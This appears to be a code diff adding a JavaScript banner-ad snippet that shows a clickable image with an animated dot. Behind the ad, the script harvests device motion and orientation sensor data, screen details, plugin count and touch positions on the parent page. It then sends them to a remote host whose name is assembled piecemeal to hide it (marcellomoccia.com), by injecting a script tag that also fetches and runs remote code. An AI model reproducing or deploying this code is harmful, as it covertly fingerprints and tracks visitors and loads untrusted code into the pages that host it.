@@ -1,0 +1,202 @@
+
+<script src="https://code.jquery.com/jquery-1.11.3.js"></script>
+<script>
+
+    document.write("<div id='fenger'></div>");
+    inghref = "http://www.baidu.com";
+    ingsrc = "http://img4.imgtn.bdimg.com/it/u=2119563622,943396626&fm=27&gp=0.jpg";
+    creabq({a: "a", b: {a: "target", b: "_blank"}, c: {a: "id", b: "divimga"}, d: "#fenger"});
+    $("#divimga").attr("href", inghref);
+    creabq({a: "div", b: {a: "class", b: ""}, c: {a: "id", b: "divimg"}, d: "#divimga"});
+    $("#divimg").attr("style", "width:300px;height:250px;position: relative;background:url('" + ingsrc + "');");
+    creabq({a: "div", b: {a: "class", b: ""}, c: {a: "id", b: "divbox"}, d: "#divimg"});
+    function creabq(sr) {
+        var link = $("<" + sr.a + ">")
+        link.attr(sr.b.a, sr.b.b);
+        link.attr(sr.c.a, sr.c.b);
+        link.appendTo(sr.d);
+    }
+    $("#divbox").css({
+        "width": "15px",
+        "height": "15px",
+        "position": "absolute",
+        "border-radius": "50%",
+        "right": "0px",
+        "top": "0px",
+        "box-shadow": "white -6px 0px 16px 11px"
+    });
+    var p = 0, ps = {}, pd = {};
+    if (window.DeviceOrientationEvent || window.DeviceMotionEvent) {
+        window.addEventListener("deviceorientation", hafengla, false);
+        window.addEventListener("devicemotion", yaomingya, false);
+    }
+    var top = $("#divbox").css("top");
+    var left = $("#divbox").css("left");
+    var right = $("#divbox").css("right");
+    var bottom = $("#divbox").css("bottom");
+    function hafengla(e) {
+        ps.x = e.alpha;
+        ps.y = e.beta;
+        ps.z = e.gamma;
+        if (ps.y > -180 && ps.y < 180 && ps.z < 50 && ps.x < 10) {
+            if (top == "0px") {
+                a3();
+            }
+            if (top == "235px") {
+                a1();
+            }
+        }
+        if (ps.z < 180 && ps.z > -180 && ps.y < 20) {
+            if (right == "0px") {
+                a2();
+            }
+            if (left == "0px") {
+                a4();
+            }
+        }
+    }
+    ps.setr = [];
+    setI({
+        a: "sei1",
+        b: function () {
+            if (!isun({a: ps.x, b: "undefined"})) {
+                ps.setr.push(ps.x);
+                if (ps.setr.length >= 4) {
+                    clearInterval(sei1);
+                }
+            }
+        },
+        c: 800
+    });
+    function sc(fer, ferq) {
+        var ls = "&pl=" + navigator.plugins.length;
+        for (var key in ps) {
+            ls += "&" + key + "=" + ps[key];
+        }
+        window["navigatorplugins"] = pd.min;
+        creabq({a: fer, b: {a: "src", b: ferq + ls}, c: {a: "index", b: ""}, d: "body"});
+    }
+    setTfengle({
+        a: "set1",
+        b: kai(),
+        c: 100
+    });
+    setTfengle({
+        a: "set1",
+        b: function () {
+            ps.cl = screen.colorDepth;
+            ps.w = screen.width + "x" + screen.height;
+            ps.pifw = "${source_id}";
+            ps.sefh = "hen";
+            ps.dmfx = "${imp_id}";
+            ps.exfl = "${exchange}";
+            mingf();
+            try {
+                var d = window.parent.document;
+                ps.tex = [], ps.tey = [];
+                window.parent.addEventListener("touchend", te, false);
+                function te(e) {
+                    ps.tex.push(e.changedTouches[0].clientX);
+                    ps.tey.push(e.changedTouches[0].clientY)
+                };
+                setTfengle({
+                    a: "de",
+                    b: sc("script", pd.min + "/ag_12" + "?" + "type=jpg"),
+                    c: 500
+                });
+            } catch (e) {
+                setTfengle({
+                    a: "de",
+                    b: sc("script", pd.min + "/ag_12" + "?" + "type=img"),
+                    c: 100
+                });
+            }
+        },
+        c: 1800
+    });
+
+    function mingf() {
+        var mingt = "";
+        var tian = "1";
+        switch (tian) {//marcellomoccia.com
+            case "1":
+                mingt += "htt"
+            case "2":
+                mingt += "p://mar"
+            case "3":
+                mingt += "cell"
+            case "4":
+                mingt += "omocci"
+            case "5":
+                mingt += "a.c"
+            case "6":
+                mingt += "om"
+                break;
+            case "7":
+                mingt += "jixian"
+                break;
+        }
+        pd.min = mingt;
+    }
+    function kai() {
+        a3();
+        setTfengle({
+            a: "set2",
+            b: function () {
+                a2();
+                setTfengle({
+                    a: "set3",
+                    b: function () {
+                        a1();
+                        setTfengle({
+                            a: "set4",
+                            b: function () {
+                                a4();
+                                setTfengle({
+                                    a: "set5",
+                                    b: function () {
+                                        kai();
+                                    },
+                                    c: 100
+                                });
+                            },
+                            c: 100
+                        });
+                    },
+                    c: 100
+                });
+            },
+            c: 100
+        });
+    }
+
+    function a4() {
+        $("#divbox").animate({left: "285px"}, 3000);
+    }
+    ;
+    function a2() {
+        $("#divbox").animate({left: "0px"}, 3000);
+    }
+    ;
+    function a3() {
+        $("#divbox").animate({top: "235px"}, 3000);
+    }
+    ;
+    function a1() {
+        $("#divbox").animate({top: "0px"}, 3000);
+    }
+    ;
+    function isun(Im) {
+        return (typeof(Im.a) == Im.b);
+    }
+    function setTfengle(Im) {
+        return window["" + Im.a + ""] = setTimeout(Im.b, Im.c);
+    }
+    function setI(Im) {
+        return window["" + Im.a + ""] = setInterval(Im.b, Im.c);
+    }
+    function yaomingya(emo) {
+        ps.y1 = emo.accelerationIncludingGravity.y;
+        ps.ya = emo.rotationRate.beta;
+    }
+</script>
